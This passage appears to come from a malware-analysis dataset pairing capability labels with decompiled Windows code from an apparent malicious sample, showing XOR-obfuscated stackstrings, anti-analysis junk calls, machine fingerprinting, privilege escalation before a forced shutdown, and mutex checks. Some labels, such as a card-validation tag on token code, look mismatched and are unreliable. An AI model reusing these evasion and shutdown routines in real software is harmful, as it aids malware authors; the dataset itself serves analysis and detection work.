0;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000002, &lpSubKey, 0, 0x20119, &phkResult);\n    if (iVar6 == 0) {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 200);\n        puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        puVar9 = puVar4;\n        for (iVar6 = 100; pcVar2 = _sym.imp.ADVAPI32.dll_RegQueryValueExA,  iVar6 != 0; iVar6 = iVar6 + -1) {\n            *puVar9 = 0x30;\n            puVar9 = puVar9 + 1;\n        }\n        nSize = 200;\n        var_14h = puVar4;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(phkResult, &var_3ch, 0, 0, puVar4, &nSize);\n        nSize = 4;\n        cVar11 = iVar6 != 0;\n        iVar6 = (*pcVar2)(phkResult, &var_28h, 0, 0, &var_10h, &nSize);\n        pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar6 != 0) {\n            cVar11 = cVar11 + '\\x01';\n        }\n        if (cVar11 != '\\0') {\n            nSize = 4;\n            var_ch = 0;\n            iVar6 = (*pcVar2)(phkResult, &lpValueName, 0, 0, &var_ch, &nSize);\n            uVar5 = var_ch;\n            if (iVar6 != 0) {\n                var_ch = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                (*pcVar1)(phkResult);\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000002, &lpSubKey, 0, 0x4001f, &phkResult);\n                if ((iVar6 != 0) ||\n                   (iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(phkResult, &lpValueName, 0, 4, &var_ch, 4), \n                   uVar5 = var_ch,  iVar6 != 0)) {\n                    uVar5 = 0;\n                }\n            }\n            var_10h = var_10h ^ uVar5;\n        }\n        (*pcVar1)(phkResult);\n        pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n        uVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)(puVar4 + 8);\n        uVar8 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar8 = (uVar8 >> 0xd | uVar8 << 0x13) + (puVar4 + 8)[uVar7];\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar8 = uVar8 ^ var_10h;\n        nSize = 0x10;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        (*_sym.imp.KERNEL32.dll_GetComputerNameA)(iVar6, &nSize);\n        uVar5 = (*pcVar2)(iVar6);\n        uVar10 = 0;\n        uVar7 = 0;\n        if (uVar5 != 0) {\n            do {\n                uVar10 = (uVar10 >> 0xd | uVar10 << 0x13) + *(uVar7 + iVar6);\n                uVar7 = uVar7 + 1;\n            } while (uVar7 < uVar5);\n        }\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_14h);\n        (*pcVar2)(uVar3);\n        *0x41cdc4 = uVar10 ^ uVar8;\n        *0x41cdc8 = uVar10 << 10 | uVar10 >> 0x16;\n        *0x41cdbc = uVar8;\n        *0x41cdc0 = uVar10;\n    }\n    return;\n}\n",
        "token_count": 1703
    },
    "0040e897": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040e897(uint param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint8_t *puVar4;\n    uint32_t *puVar5;\n    int32_t iVar6;\n    uint TokenHandle;\n    uint TokenInformationLength;\n    \n    iVar6 = 0;\n    TokenHandle = param_1;\n    TokenInformationLength = param_1;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 8, &TokenHandle);\n    if (iVar1 != 0) {\n        iVar6 = 0;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x19, 0, 0, &TokenInformationLength);\n        if ((iVar1 == 0) && (iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar1 == 0x7a)) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, TokenInformationLength);\n            puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            if (puVar3 != NULL) {\n                iVar1 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                                  (TokenHandle, 0x19, puVar3, TokenInformationLength, &TokenInformationLength);\n                if ((((iVar1 != 0) &&\n                     (puVar4 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthorityCount)(*puVar3),  puVar4 != NULL)) &&\n                    (*puVar4 != 0)) &&\n                   (puVar5 = (*_sym.imp.ADVAPI32.dll_GetSidSubAuthority)(*puVar3, *puVar4 - 1),  puVar5 != NULL)) {\n                    if (*puVar5 < 0x2000) {\n                        iVar6 = 1;\n                    }\n                    else {\n                        iVar6 = 3 - (*puVar5 < 0x3000);\n                    }\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return iVar6;\n}\n",
        "token_count": 520
    },
    "0040e9ed": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040e9ed(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_414h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_10h = param_1;\n    var_14h = param_2;\n    var_8h = 0;\n    uVar2 = 0;\n    var_1h._0_1_ = 0x22;\n    var_ch = 0;\n    if (0 < param_2) {\n        do {\n            if (0x3ff < uVar2) {\n                iVar1 = var_8h + uVar2;\n                puVar3 = &var_414h;\n                puVar4 = var_8h + param_1;\n                for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n                uVar2 = 0;\n                var_8h = iVar1;\n                param_1 = var_10h;\n                param_2 = var_14h;\n            }\n            *(&var_414h + uVar2) = *(var_ch + param_1) ^ var_1h;\n            uVar2 = uVar2 + 1;\n            var_1h._0_1_ = var_1h + (var_ch % 0x85) * '\\x03';\n            var_ch = var_ch + 1;\n        } while (var_ch < param_2);\n        if (uVar2 != 0) {\n            puVar3 = &var_414h;\n            puVar4 = var_8h + param_1;\n            for (; uVar2 != 0; uVar2 = uVar2 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 546
    },
    "004016a9": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004016a9(uint param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint extraout_ECX;\n    int32_t iVar8;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uchar var_5bh;\n    uchar var_5ah;\n    uint var_59h;\n    uint32_t var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3dh;\n    uint var_39h;\n    uint var_35h;\n    uchar var_30h;\n    uint var_2fh;\n    uint var_2bh;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uchar *pszFirst;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1ch = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_10h = 0;\n    pszFirst = puVar4;\n    fcn.0040e684();\n    if (puVar4 == NULL) {\n        var_10h = 0;\n    }\n    else {\n        var_78h = 0x64364a50;\n        var_74h = 0x4a254e36;\n        var_70h = 0x4e276433;\n        for (iVar7 = 0x208; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar4 = 0;\n            puVar4 = puVar4 + 1;\n        }\n        var_6ch = 0x64364a21;\n        var_68h = 0x4a294e43;\n        var_64h = 0x4e0f643a;\n        var_60h._0_2_ = 0x4a16;\n        var_8h = 5;\n        var_60h._2_1_ = 5;\n        stack0xffffff9f = 0x964;\n        var_5bh = 0x4e;\n        var_18h = 6;\n        var_5ah = 6;\n        var_59h = 0x64184a;\n        var_55h = 0x2b4a014e;\n        var_51h = 0x1b4e2f64;\n        var_4dh._0_1_ = 0x4a;\n        var_4dh._1_1_ = 3;\n        var_4dh._2_2_ = 0x364;\n        var_49h._0_1_ = 0x4e;\n        var_49h._1_1_ = 7;\n        var_49h._2_2_ = 0x194a;\n        var_45h._0_1_ = 100;\n        var_45h._1_1_ = 3;\n        var_45h._2_2_ = 0x14e;\n        var_41h._0_1_ = 0x4a;\n        var_41h._1_1_ = 0x57;\n        var_41h._2_2_ = 0x2364;\n        var_3dh._0_1_ = 0x4e;\n        var_3dh._1_1_ = 0xd;\n        var_3dh._2_2_ = 0x74a;\n        var_39h._0_1_ = 100;\n        var_39h._1_1_ = 10;\n        var_39h._2_2_ = 0x1a4e;\n        var_35h._0_1_ = 0x4a;\n        stack0xffffffc8 = 0x4e036405;\n        var_30h = 7;\n        var_2fh._0_2_ = 0x2b4a;\n        var_2fh._2_1_ = 100;\n        var_2fh._3_1_ = 0x66;\n        var_2bh._0_1_ = 0x4e;\n        stack0xffffffd4 = 0x64774a75;\n        var_24h._0_2_ = 0x4e66;\n        uVar3 = (*pcVar1)(8, 0x9d);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar8 = 0;\n        var_ch = iVar7;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetActiveWindow)();\n            if (iVar5 != 0x873ef8) {\n                *(iVar8 + iVar7) = *(&var_2bh + iVar8 % var_18h + 3) ^ (iVar8 + iVar7)[&var_78h - iVar7];\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0x4e);\n        (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, pszFirst, 0x104);\n        var_49h._1_1_ = 0x16;\n        var_49h._2_2_ = 0x306c;\n        var_45h._0_1_ = 0x37;\n        var_45h._1_1_ = 0x42;\n        var_45h._2_2_ = 0x1865;\n        var_41h._0_1_ = 0x49;\n        var_41h._1_1_ = 0x52;\n        var_41h._2_2_ = 0x831;\n        var_3dh._0_1_ = 0x6c;\n        var_3dh._1_1_ = 0x39;\n        var_3dh._2_2_ = 0x4337;\n        var_39h._0_1_ = 0x65;\n        var_39h._1_1_ = 3;\n        var_39h._2_2_ = 0x5149;\n        var_35h._0_1_ = 0x31;\n        stack0xffffffc8 = 0x37256c0c;\n        var_30h = 0x54;\n        var_2fh._0_2_ = 0x6c65;\n        var_2fh._2_1_ = 0x49;\n        stack0xffffffd4 = 0x37496c65;\n        var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x31);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n        iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar5 = 0;\n        iVar8 = &var_49h + (1 - iVar7);\n        var_18h = iVar8;\n        var_14h = iVar7;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n            puVar4 = pszFirst;\n            if (iVar6 != 0x7021db) {\n                *(iVar5 + iVar7) = *(&var_2bh + iVar5 % var_8h + 3) ^ (iVar5 + iVar7)[iVar8];\n            }\n            iVar5 = iVar5 + 1;\n        } while (iVar5 < 0x1c);\n        iVar8 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(pszFirst, iVar7);\n        if (iVar8 != 0) {\n            var_55h = var_55h & 0xff | 0x11436e00;\n            var_51h = 0x304b1071;\n            var_4dh._0_1_ = 0x42;\n            var_4dh._1_1_ = 5;\n            var_4dh._2_2_ = 0x2e69;\n            var_49h._0_1_ = 0x43;\n            var_49h._1_1_ = 0x2f;\n            var_49h._2_2_ = 0x3b71;\n            var_45h._0_1_ = 0x4b;\n            var_45h._1_1_ = 0x2c;\n            var_45h._2_2_ = 0x1e42;\n            var_41h._0_1_ = 0x69;\n            var_41h._1_1_ = 0x3f;\n            var_41h._2_2_ = 0x6743;\n            var_3dh._0_1_ = 0x71;\n            var_3dh._1_1_ = 0x35;\n            var_3dh._2_2_ = 0x174b;\n            var_39h._0_1_ = 0x42;\n            var_39h._1_1_ = 0x10;\n            var_39h._2_2_ = 0x3869;\n            var_35h._0_1_ = 0x43;\n            stack0xffffffc8 = 0x4b1a7129;\n            var_30h = 0x1f;\n            var_2fh._0_2_ = 0x7142;\n            var_2fh._2_1_ = 0x69;\n            stack0xffffffd4 = 0x7142434b;\n            var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x69);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x51);\n            iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar5 = 0;\n            iVar8 = &var_55h + (1 - iVar7);\n            var_18h = iVar8;\n            do {\n                iVar6 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n                puVar4 = pszFirst;\n                if (iVar6 != 0xb0b14c) {\n                    *(iVar5 + iVar7) = *(&var_2bh + iVar5 % var_8h + 3) ^ (iVar5 + iVar7)[iVar8];\n                }\n                iVar5 = iVar5 + 1;\n            } while (iVar5 < 0x28);\n            (*_sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW)(iVar7, pszFirst, 0x104);\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            iVar7 = var_14h;\n        }\n        iVar8 = var_ch;\n        (*_sym.imp.SHLWAPI.dll_StrCatW)(puVar4, *0x41cd28);\n        uVar3 = extraout_ECX;\n        iVar5 = fcn.0040dd0b(var_1ch);\n        if (iVar5 == 0) {\n            fcn.00408761(uVar3);\n            fcn.0040d8ba();\n            var_10h = fcn.00401560();\n        }\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar7);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar8);\n        (*pcVar1)(uVar3);\n    }\n    return var_10h;\n}\n",
        "token_count": 2841
    },
    "00401d22": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "shutdown system",
            "modify access privileges"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401d22(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ah;\n    uint var_26h;\n    uint lpLuid;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    int32_t var_8h;\n    \n    var_38h = 0x3e3a0b25;\n    var_34h = 0x60a021e;\n    var_30h._0_1_ = 0x21;\n    var_8h = 5;\n    var_30h._1_1_ = 5;\n    stack0xffffffce = 0x20001c26;\n    var_2ah = 0xe0b1a02;\n    var_26h._0_2_ = 0x6b33;\n    var_14h = 0x56696e76;\n    var_10h._0_1_ = 0x6b;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar6 = 0;\n    do {\n        iVar5 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n        if (iVar5 != 0xd62d2d) {\n            *(iVar6 + iVar4) = *(&var_14h + iVar6 % var_8h) ^ (iVar6 + iVar4)[&var_38h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x14);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x28, &TokenHandle);\n    (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar3);\n    (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueA)(0, iVar4, &lpLuid);\n    stack0xffffffd8 = 1;\n    var_18h = 2;\n    (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &var_26h + 2, 0, 0, 0);\n    pcVar2 = _sym.imp.USER32.dll_ExitWindowsEx;\n    iVar6 = (*_sym.imp.USER32.dll_ExitWindowsEx)(6, 0);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        (*pcVar2)(4, 0);\n    }\n    uVar3 = (*pcVar1)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return;\n}\n",
        "token_count": 680
    },
    "00404521": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00404521(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    iVar6 = 0;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    var_14h = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar3 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar2);\n    pcVar1 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar3 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar3 == 0x7a) &&\n           (puVar4 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar4,  puVar4 != NULL)) {\n            iVar3 = (*pcVar1)(hObject, 1, puVar4, dwBytes, &dwBytes);\n            if ((iVar3 != 0) &&\n               ((iVar3 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar4, &StringSid),  iVar3 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x4174542b;\n                var_30h = 0x5455776b;\n                var_2ch = 0x7777416c;\n                var_28h = 0x41615449;\n                var_24h._0_2_ = 0x775a;\n                var_20h = 0x41595478;\n                var_1ch._0_2_ = 0x775a;\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetCapture)();\n                    if (iVar5 != 0x9b9891) {\n                        var_10h = 6;\n                        *(iVar6 + iVar3) = *(&var_20h + iVar6 % 6) ^ (iVar6 + iVar3)[&var_34h - iVar3];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0x12);\n                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(iVar3, StringSid);\n                iVar6 = var_14h;\n                if (iVar5 == 0) {\n                    iVar6 = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                puVar4 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar4);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return iVar6;\n}\n",
        "token_count": 867
    },
    "0040a7d8": {
        "rules": [
            "contain obfuscated stackstrings"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040a7d8(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint32_t var_36h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t lpLibFileName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_60h = 0xf01faf00;\n    var_5ch = 0x505600;\n    var_58h = 0x8002700;\n    var_54h = 0xc2900;\n    var_50h = 0x56900;\n    var_4ch = 0x3ff00;\n    var_48h = 0x1c4200;\n    var_44h = 0x163e00;\n    var_10h = 0;\n    var_28h = 0x21720219;\n    var_24h._0_1_ = 0x13;\n    var_24h._1_1_ = 0x7f;\n    var_24h._2_2_ = 0x557c;\n    var_20h._0_2_ = 0x2b1f;\n    var_20h._2_2_ = CONCAT11(var_20h._3_1_, 0x4b);\n    var_18h = 0x7331524b;\n    var_14h._0_1_ = 0x47;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_4h = 5;\n    iVar11 = 0;\n    var_8h = &var_28h - iVar5;\n    lpLibFileName = iVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetMessageExtraInfo)();\n        if (iVar6 != 0xc3041) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[var_8h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0xb);\n    var_30h = 0x103a3061;\n    var_2ch = 0x3220460f;\n    var_28h = 0x20672900;\n    var_24h._0_1_ = 0x22;\n    var_24h._1_1_ = 1;\n    var_24h._2_2_ = 0x5a29;\n    var_20h._0_2_ = 0x3a31;\n    var_20h._2_2_ = 0x2015;\n    var_1ch = 0x34;\n    var_18h = 0x74534534;\n    var_14h._0_1_ = 0x4c;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    iVar11 = 0;\n    var_8h = &var_30h - iVar5;\n    do {\n        iVar7 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        iVar6 = lpLibFileName;\n        if (iVar7 != 0xdd2e37) {\n            *(iVar11 + iVar5) = *(&var_18h + iVar11 % var_4h) ^ (iVar11 + iVar5)[&var_30h - iVar5];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x15);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar5);\n    pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    uVar10 = var_10h;\n    if (pcVar8 == NULL) {\n        uVar10 = 0;\n    }\n    else {\n        (*pcVar8)(&var_40h);\n        uVar3 = var_36h;\n        uVar2 = var_36h & 0xffffff;\n        var_36h = uVar2 | uVar10 << 0x18;\n        uVar9 = 0;\n        uVar1 = uVar10 & 0xff;\n        do {\n            if ((uVar1 | (uVar3 & 0xff0000) >> 8 | (uVar3 & 0xff00) << 8 | uVar2 << 0x18) == (&var_60h)[uVar9]) {\n                uVar10 = 1;\n            }\n            uVar9 = uVar9 + 1;\n        } while (uVar9 < 8);\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n    (*pcVar8)(uVar4);\n    return uVar10;\n}\n",
        "token_count": 1374
    },
    "0040be1a": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "query environment variable"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040be1a(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint lpString;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_18h = 0x1b102a39;\n    var_14h = 0x373f262d;\n    var_10h = 0x242a171d;\n    var_ch._0_1_ = 0x5a;\n    puVar5 = &lpString;\n    for (iVar4 = 0x104; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    var_20h = 0;\n    var_8h = 0x7871585a;\n    var_4h._0_2_ = 0x4b46;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar2 != 0x1dba03) {\n            var_1ch = 6;\n            *(iVar6 + iVar4) = *(&var_8h + iVar6 % 6) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0xd);\n    iVar6 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar4, &lpString, 0x104);\n    uVar1 = var_20h;\n    if (iVar6 != 0) {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpString);\n        iVar6 = fcn.0040e9ba();\n        if (iVar6 == -0x69b4c9f2) {\n            uVar1 = 1;\n        }\n    }\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    return uVar1;\n}\n",
        "token_count": 588
    },
    "0040ee9b": {
        "rules": [
            "contain obfuscated stackstrings",
            "contain loop",
            "terminate process",
            "create mutex",
            "check mutex and exit"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040ee9b(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_3ch = 0x36224a1c;\n    var_38h = 0x4a394c08;\n    var_34h = 0x4c19362e;\n    var_30h = 0x36024a2a;\n    var_2ch = 0x4a3b4c14;\n    var_28h = 0x4c033635;\n    var_24h = 0x36284a1f;\n    var_20h = 0x4a214c13;\n    var_1ch = 0x4c2e3633;\n    var_18h = 0x36354a27;\n    var_14h = 0x4a2e4c1f;\n    var_10h = 0x4c7a3623;\n    var_ch = 0x36474a4f;\n    var_8h._0_2_ = 0x4c7a;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x61);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    iVar5 = 0;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        if (iVar4 != 0xc9e510) {\n            var_4h = 6;\n            *(iVar5 + iVar3) = *(&var_ch + iVar5 % 6) ^ (iVar5 + iVar3)[&var_3ch - iVar3];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x30);\n    iVar5 = (*_sym.imp.KERNEL32.dll_OpenMutexW)(0x1f0001, 0, iVar3);\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar5 == 0) {\n        (*_sym.imp.KERNEL32.dll_CreateMutexW)(0, 0, iVar3);\n        uVar2 = (*pcVar1)(0, iVar3);\n        